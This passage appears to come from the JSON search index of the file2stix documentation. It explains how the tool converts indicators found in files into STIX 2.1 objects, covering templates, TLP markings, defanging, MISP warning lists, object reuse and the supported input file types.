Overview"},{"location":"extractions/#extractions","text":"file2stix extracts observables from text and translates them into STIX 2.1 Objects. This section of the documentation describes the templates of the STIX Objects created.","title":"Extractions"},{"location":"extractions/#stix-support","text":"file2stix only supports STIX version 2.1 as defined by this specification .","title":"STIX Support"},{"location":"extractions/#identities-identity-sdos","text":"file2stix assigns a created_by_ref property to many Objects. By defaults the generic file2stix identity will be used. You can also change the Identity used by creating your own template file (see example tests/stix_templates/custom_identity_good.yml ). This is passed using the --user-identity-file flag. If you do modify the file make sure to follow the schema defined herel tests/stix_templates/custom_identity_schema.yml Here are some of the common things that can cause error; Keep the quotes ( \"\" ) around values Replace the UUID in the id property with your own or a randomly generated UUID v4. Here is a generator you can use to do this e.g. identity--acf55024-6bbe-486f-a27a-7967559324f4 -> identity--bf65f135-7876-4b4f-a48b-4cbd85e77e87 Modify the created and modified dates, if needed. Be sure to keep the same date/time format YYYY-DD-MMTHH:MM:SS.sssZ Update the name and description fields. If using special json characters be sure to escape them The identity_class property must match one shown here The sectors property must match one shown here","title":"Identities (identity) SDOs"},{"location":"extractions/#report-sdos-report","text":"All individual data sources ingested or uploaded are represented as a unique STIX Report SDO that take the following structure; { \"type\": \"report\", \"spec_version\": \"2.1\", \"id\": \"report--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IDENTITY ID>\", \"created\": \"<ITEM INGEST DATE>\", \"modified\": \"<ITEM INGEST DATE>\", \"name\": \"File converted: <FILENAME>\", \"published\": \"<ITEM INGEST DATE>\", \"report_types\": [\"threat-report\"], \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"object_refs\": [\"<LIST OF ALL EXTRACTED OBJECTS>\"], \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } Note, the object_refs contains all references that are referenced by objects in the report (SDOs, SROs, SCOs). This includes extracted objects (i.e. Indicator SDOs, Vulnerability SDOs, Software SCOs, Relationship SROs etc.).","title":"Report SDOs (report)"},{"location":"extractions/#relationship-sros-relationship","text":"There are two types of extractions in file2stix; default and custom. T","title":"Relationship SROS (relationship)"},{"location":"extractions/#default-extractions-report-and-sdo","text":"In the case of default extractions, a Relationship between the extracted Object and Report SDO is created with the relationship_type equal to default-extract. The created_by_ref is the Identity ID. The created and modified dates match those in the linked Report Object. Here is the structure of the SRO for default extractions; { \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<USER IDENTITY ID>\", \"created\": \"<REPORT CREATED DATE>\", \"modified\": \"<REPORT CREATED DATE>\", \"relationship_type\": \"default-extract-from\", \"source_ref\": \"<EXTRACTED STIX OBSERVABLE ID>\", \"target_ref\": \"report--<REPORT OBJECT>\", \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] }","title":"Default extractions (Report and SDO)"},{"location":"extractions/#custom-extractions-report-and-sdo","text":"Custom extractions have slightly different Relationship Objects created where the relationship_type equal to custom-extract, as follows; { \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<USER IDENTITY ID>\", \"created\": \"<REPORT CREATED DATE>\", \"modified\": \"<REPORT CREATED DATE>\", \"relationship_type\": \"custom-extract-from\", \"source_ref\": \"<EXTRACTED STIX OBSERVABLE ID>\", \"target_ref\": \"report--<REPORT OBJECT>\", \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] }","title":"Custom extractions (Report and SDO)"},{"location":"extractions/#sco-and-sdo-relationships","text":"Many extractions that create Indicator Objects also create one or more SCOs. These are joined like so { \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<USER IDENTITY ID>\", \"created\": \"<REPORT CREATED DATE>\", \"modified\": \"<REPORT CREATED DATE>\", \"relationship_type\": \"pattern-contains\", \"source_ref\": \"indicator--<EXTRACTED STIX INDICATOR ID>\", \"target_ref\": \"<EXTRACTED STIX SCO ID>\", \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] }","title":"SCO and SDO relationships"},{"location":"extractions/#confidence-scoring","text":"file2stix also optionally allows you to add the confidence property to all extracted Indicator SDOs. You can set confidence between 0 - 100. Consult the STIX 2.1 Specification for more information if you're unfamiliar with confidence scoring . Confidence is passed using the --confidence flag.","title":"Confidence scoring"},{"location":"extractions/#tlp-marking-definition","text":"The default TLP level assigned is TLP:WHITE . You can change the TLP level using the --tlp-level flag. file2stix allows for TLP:GREEN , TLP:AMBER , TLP:RED and TLP:WHITE definitions to be used when adding Reports. This determines the STIX marking-definition , either; TLP:WHITE ( marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9 ) TLP:GREEN ( marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da ) TLP:AMBER ( marking-definition--f88d31f6-486f-44da-b317-01333bde0b82 ) TLP:RED ( marking-definition--5e57c739-391a-4eb3-b6be-7d15ca92d5ed ) The TLP value is reported in the object_marking_refs property for the STIX Report Object and all extracted Objects representing extracted Observables (except for ATT&CK or CAPEC, where generic MITRE Objects are used).","title":"TLP (marking-definition)"},{"location":"extractions/#defanging","text":"Defanging obfuscates indicators into a safer representations so that a user reading a report does not accidentally click on a malicious URL or inadvertently run malicious code. Many cyber threat intelligence reports shared electronically employ defanging. Typical types of fanged Observables include IPv4 addresses (e.g. 1.1.1.1 ), IPv6 addresses (e.g. 2001:0db8:85a3:0000:0000:8a2e:0370:7334 ), domain names (e.g. example.com ), URLs (e.g. https://example.com/research/index.html ), email addresses (e.g. example@example.com ), file extensions (e.g. malicious.exe ), and directory paths (e.g. C:\\\\Windows\\\\System32 ). Unfortunately, there is no universal standard for defanging, although there are some common methods. Some samples of defanging I have observed include the following: Wrapping one or more special characters in [ ] e.g. www[.]example[.]com e.g. http[:]//example.com e.g. http[://]example.com e.g. 1.1.1.1[/]24 Wrapping one or more special characters in { } Wrapping one or more special characters in ( ) Prefixing one or more special characters with [ e.g. www[.example[.com e.g. http[://example.com e.g. http[://example.com Prefixing one or more special characters with \\ Replacing http and hxxp e.g. hxxps://google.com Replacing . with dot e.g. example@example dot com e.g. http://example dot com Replacing . with [dot] (or (dot) , or {dot} ) e.g. example@example[dot]com Replacing @ with at e.g. example at example.com Replacing @ with [at] (or (at) , or {at} ) e.g. example[at]example.com Note, a combination of the above techniques are also commonly implemented used. For example replacing . with dot and replacing @ with at for an email like so; fanged = example at example dot com , defanged = example@example.com Another example using even more fanging technique combinations for a URL; fanged = hxxps[:]//test\\.example[.)com[/]path , defanged = https://test.example.com/path file2stix can be used to defang the following observable types ipv4 ipv6 domain url email-address Defanging will only occur if the --defang-observables is set to true (by default it is false ). When set to true, all SCO Objects that have been defanged will contain the property \"defanged\": true . For example; { \"type\": \"email-addr\", \"spec_version\": \"2.1\", \"id\": \"email-addr--0e81edfb-25a5-5cb0-8cb0-fe9c5efb6257\", \"value\": \"example9@example.com`\", \"defanged\": true }","title":"Defanging"},{"location":"extractions/#branding","text":"By default file2stix will populate the external_references section of all SDOs and SROs with a reference to file2stix. \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } It is possible to remove this by using the --no-branding flag.","title":"Branding"},{"location":"extractions/#warning-lists","text":"Warning Lists identify potentially benign file2stix extractions. DO NOT BE CONFUSED by the name; Warning Lists in file2stix are the equivilant of whitelists in other products. file2stix uses MISP Warning Lists (using PyMISPWarningLists ) to identify potential extractions that should be whitelisted using a custom Extension definition. https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/property-extension/warning-list-extension/extension-definition--c8ea5ecb-f4a3-45e7-94de-9b9ba05161af/20220101000000000.json Extracted values that match a Warning List are still converted to STIX 2.1 Objects, however, will contain the custom property listing the Warning Lists the extracted value matches with and will also contain indicator_types = benign . For example; { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--fb715301-acf3-4add-a70a-2b96f5ac15f5\", \"created\": \"2022-09-07T06:18:21.997149Z\", \"modified\": \"2022-09-08T06:13:24.191194Z\", \"name\": \"Domain: google.com\", \"indicator_types\": [ \"unknown\", \"benign\" ], \"pattern\": \"[ domain-name:value = 'google.com' ]\", \"pattern_type\": \"stix\", \"pattern_version\": \"2.1\", \"valid_from\": \"2022-09-07T06:18:21.997149Z\", \"object_marking_refs\": [ \"marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9\" ], \"extensions\": { \"extension-definition--c8ea5ecb-f4a3-45e7-94de-9b9ba05161af\": { \"extension_type\": \"property-extension\", \"warning_list_match\": [ { \"list_name\": \"Top 20 000 websites from Cisco Umbrella\", \"list_url\": \"https://misp.github.io/misp-warninglists/lists/cisco_top20k/list.json\", \"list_type\": \"misp\" }, { \"list_name\": \"Custom list with url\", \"list_url\": \"https://example.com/list.json\", \"list_type\": \"custom\" }, { \"list_name\": \"Custom list with local path\", \"list_type\": \"custom\" } ] } }, \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } Note, MISP Warning Lists contain a type value (defined in the Warning List JSON). file2stix treats each Warning List differently, depending on its type as follows; string : extracted observables must be exact match to Warning List value (e.g. warning list: google.com -> observable: google.com = match) substring : extracted observable must contain Warning List value (e.g. warning list: google -> observable: api.google.com = match) hostname : extracted observable must contain Warning List value cidr : extracted observable must be exact match to Warning List value regex : file2stix does not consider warning lists of type regex It is possible to completely ignore extractions that match to warning lists (and not create a STIX Object from them) using the flag --ignore-warninglist-observables . By default file2stix will compare all MISP Warning lists (about 50 in total) to the input.","title":"Warning Lists"},{"location":"extractions/#custom-warning-lists","text":"You can also create your own Warning Lists. Custom Warning Lists must follow the MISP Warning List schema . An example of a custom warning list can be seen in tests/file_inputs/custom_warning_lists/list.json Due to the way data is shared, only Reports marked TLP GREEN, TLP AMBER, or TLP RED can be used with custom warning lists. As TLP WHITE reports are shared without attribution, printing a Warning List name will not be enough for a downstream user to determine what/who/and where the Warning List came from. You can either pass a custom warning list as a local file path to the warning list json, e.g. tests/file_inputs/custom_warning_lists/list.json or using a url, e.g. http://www.example.com/custom_warning_lists/list.json . e.g. file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN Or file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file \"https://raw.githubusercontent.com/signalscorps/file2stix/main/tests/warning_lists/custom_list.json\" --tlp-level GREEN file2stix will first check the Warning List is in the expected MISP Warning List format. If not, it will return an error and will not process the file.","title":"Custom Warning Lists"},{"location":"extractions/#extracted-object-logic","text":"If the same Observable is identified more than once in the same report, only one extraction is made. For example, if 1.1.1.1 is seen 3 times in a report, only one Indicator SDO is created for it. If using Observed or Sighting mode the Observed Data SDO will count the occurances of an observable in the report using the number_observed field. Note, the settings passed to the command line also determine how the following object types are created;","title":"Extracted Object logic"},{"location":"extractions/#sros","text":"These are never reused, and unique to every report.","title":"SROs"},{"location":"extractions/#sdos","text":"file2stix reuses SDO Indicator, Vulnerability and Location objects (for default extractions) and Attack Pattern, Campaign, Course of Action, Infrastructure, Intrusion Set, Malware, Threat Actor, Tool when the following properties match: confidence: different confidence scores cn (assigned with --confidence flag) user identity: can be custom (assigned with --user-identity-file flag) TLP: either white, green, amber, or red (assigned with tlp-level flag) branding: file2stix branding can be removed (assigned with --no-branding flag) custom warning list: users can assign their own warning list which will be reported in a custom extension inside each SDO (assigned with --misp-custom-warning-list-file flag). Put another way, if the same combination of TLP, identity confidence, branding and warning list exists, a previously created object is updated, else a new one is created. Observered Data SDOs are always unique. In the case where an SDO is reused, the modified property is update to reflect the latest observation of the observable.","title":"SDOs"},{"location":"extractions/#example-1","text":"To demonstrate how this works in practice, lets assume in report 1 an IPv4 address observable ( 198.51.100.3 ) is detected. Assuming the IPv4 address ( 198.51.100.3 ) has not been saved as an IPv4 address SDO previously from a report with the same confidence, identity, TLP, branding and custom warning list settings, a new SDO would be created for it (in this case, lets give it id = ff26c055-6336-5bc5-b98d-13d6226742dd ). The created and modified properties for this STIX Object would both have the same timestamp (the time of extraction). If this IPv4 address ( 198.51.100.3 ) was later detected in another data source imported to file2stix and that report was created with the same confidence, identity, TLP, branding and custom warning list settings, the existing SDO would be used (and updated) to represent the extraction.","title":"Example 1"},{"location":"extractions/#example-2","text":"Lets now imagine a third report was uploaded with 198.51.100.3 in it. However, this time the report is uploaded with a different TLP to the two previous reports described in example 1. In this case, a brand new Indicator SDO would be created for this extraction. If a fourth report was uploaded with 198.51.100.3 in it, with the same settings used for report 3, the same SDO created in report 3 would be reused. This does not include SCOs (e.g. Software Objects). Here the existing Object would be used, but not updated (because they do not contain created or modified properties) ti.","title":"Example 2"},{"location":"extractions/#scos","text":"SCOs use the value field as an ID Contributing property. See the STIX spec for more; https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_q6l05xzpcdf Therefore, SCOs do not contain branding, tlp, identity, confidence or warning list and therefore SCOs are always reused if the value field matches. Take the examples 1 and 2 for SDOs above, in this case one ipv4-addr SCO for 198.51.100.3 would be created.","title":"SCOs"},{"location":"extractions/#mode-specific-extractions","text":"The type of Objects created during extraction depends on the mode used. file2stix offers two modes; analysis (default): used during research to create STIX 2.1 Objects from general threat research View Analysis Mode documentation here observed : allows you to keep track of how many times you've seen an extraction in a report View Observed Mode documentation here sighting : used to denote that extractions from a report represent real instances of an observable being seen in your environment (generally used for log inputs) View Sighting Mode documentation here","title":"Mode specific extractions"},{"location":"inputs/","text":"Inputs \u00b6 You can upload a range of filetypes to file2stix. This section of the documentation explains the types of files you can upload and how they are processed before extraction happens. Supported filetypes \u00b6 file2stix uses Python library called textract to extract text from files. Once text has been extracted, the actual filetype determines what part of that text is considered for matching to extraction regular expressions. Plain text ( .txt ) \u00b6 Plain text files are not processed. All content in a .txt file is considered. e.g. file2stix --input-file tests/file_inputs/txt/input.txt CSV ( .csv ) \u00b6 CSV files are not processed. All content in a .csv file is considered. e.g. file2stix --input-file tests/file_inputs/csv/input.csv HTML ( .html ) \u00b6 All HTML tags are stripped from the parsed text before extractions are run. For example, <a href=\"URL_INSIDE_HTML_TAG\">PRINTED_URL</a> , only PRINTED_URL would remain for extraction pattern matching. e.g. file2stix --input-file tests/file_inputs/html/input.html Note, html can get very messy. We generally recommend using a html to pdf tool (e.g. printfriendly or similar) and uploading the page as a pdf (or whatever less messy file structure you covert to) for best results. Markdown ( .md , .markdown ) \u00b6 Markdown can contain HTML. If HTML elements are detected, these are stripped (in the same way as done for HTML inputs). Only content between HTML tags is considered. For example, <a href=\"URL_INSIDE_HTML_TAG\">PRINTED_URL</a> , only PRINTED_URL would remain for extraction pattern matching. e.g. file2stix --input-file tests/file_inputs/md/input.md PDF ( .pdf ) \u00b6 Only printed text in a pdf is considered for matching. e.g. file2stix --input-file tests/file_inputs/pdf/input.pdf XML ( .xml ) \u00b6 All XML tags are stripped from the parsed text before extractions are run. For example, <url = \"URL_INSIDE_XML_TAG\">PRINTED_URL</url> , only PRINTED_URL would remain for extraction pattern matching e.g. file2stix --input-file tests/file_inputs/xml/input.xml JSON ( .json ) \u00b6 Only values are considered for json inputs. For example; {\"1.1.1.1\": \"SOME_IP\"} , only SOME_IP would remain for matching. e.g. file2stix --input-file tests/file_inputs/json/input.json Microsoft Word ( .doc , .docx ) \u00b6 Only printed text in a Word doc is considered for matching. e.g. file2stix --input-file tests/file_inputs/doc/input.docx Microsoft Excel ( .xls , .xlsx ) \u00b6 Only printed text in a Excel doc is considered for matching (formulas and scripts are ignored). e.g. file2stix --input-file tests/file_inputs/xls/input.xlsx YAML ( .yml , .yaml ) \u00b6 YAML files are not processed. All content in a YAML file is considered. e.g. file2stix --input-file tests/file_inputs/yaml/input.yml YARA ( .yar , .yara ) \u00b6 All content in yara filetypes is considered. Howevere, this input is designed for importing single yara rules only. Generally a single yara rule. e.g. file2stix --input-file tests/file_inputs/yara/input.yar","title":"2. Inputs"},{"location":"inputs/#inputs","text":"You can upload a range of filetypes to file2stix. This section of the documentation explains the types of files you can upload and how they are processed before extraction happens.","title":"Inputs"},{"location":"inputs/#supported-filetypes","text":"file2stix uses Python library called textract to extract text from files. Once text has been extracted, the actual filetype determines what part of that text is considered for matching to extraction regular expressions.","title":"Supported filetypes"},{"location":"inputs/#plain-text-txt","text":"Plain text files are not processed. All content in a .txt file is considered. e.g. file2stix --input-file tests/file_inputs/txt/input.txt","title":"Plain text (.txt)"},{"location":"inputs/#csv-csv","text":"CSV files are not processed. All content in a .csv file is considered. e.g. file2stix --input-file tests/file_inputs/csv/input.csv","title":"CSV (.csv)"},{"location":"inputs/#html-html","text":"All HTML tags are stripped from the parsed text before extractions are run. For example, <a href=\"URL_INSIDE_HTML_TAG\">PRINTED_URL</a> , only PRINTED_URL would remain for extraction pattern matching. e.g. file2stix --input-file tests/file_inputs/html/input.html Note, html can get very messy. We generally recommend using a html to pdf tool (e.g. printfriendly or similar) and uploading the page as a pdf (or whatever less messy file structure you covert to) for best results.","title":"HTML (.html)"},{"location":"inputs/#markdown-md-markdown","text":"Markdown can contain HTML. If HTML elements are detected, these are stripped (in the same way as done for HTML inputs). Only content between HTML tags is considered. For example, <a href=\"URL_INSIDE_HTML_TAG\">PRINTED_URL</a> , only PRINTED_URL would remain for extraction pattern matching. e.g. file2stix --input-file tests/file_inputs/md/input.md","title":"Markdown (.md, .markdown)"},{"location":"inputs/#pdf-pdf","text":"Only printed text in a pdf is considered for matching. e.g. file2stix --input-file tests/file_inputs/pdf/input.pdf","title":"PDF (.pdf)"},{"location":"inputs/#xml-xml","text":"All XML tags are stripped from the parsed text before extractions are run. For example, <url = \"URL_INSIDE_XML_TAG\">PRINTED_URL</url> , only PRINTED_URL would remain for extraction pattern matching e.g. file2stix --input-file tests/file_inputs/xml/input.xml","title":"XML (.xml)"},{"location":"inputs/#json-json","text":"Only values are considered for json inputs. For example; {\"1.1.1.1\": \"SOME_IP\"} , only SOME_IP would remain for matching. e.g. file2stix --input-file tests/file_inputs/json/input.json","title":"JSON (.json)"},{"location":"inputs/#microsoft-word-doc-docx","text":"Only printed text in a Word doc is considered for matching. e.g. file2stix --input-file tests/file_inputs/doc/input.docx","title":"Microsoft Word (.doc, .docx)"},{"location":"inputs/#microsoft-excel-xls-xlsx","text":"Only printed text in a Excel doc is considered for matching (formulas and scripts are ignored). e.g. file2stix --input-file tests/file_inputs/xls/input.xlsx","title":"Microsoft Excel (.xls, .xlsx)"},{"location":"inputs/#yaml-yml-yaml","text":"YAML files are not processed. All content in a YAML file is considered. e.g. file2stix --input-file tests/file_inputs/yaml/input.yml","title":"YAML (.yml, .yaml)"},{"location":"inputs/#yara-yar-yara","text":"All content in yara filetypes is considered. Howevere, this input is designed for importing single yara rules only. Generally a single yara rule. e.g. file2stix --input-file tests/file_inputs/yara/input.yar","title":"YARA (.yar, .yara)"}]}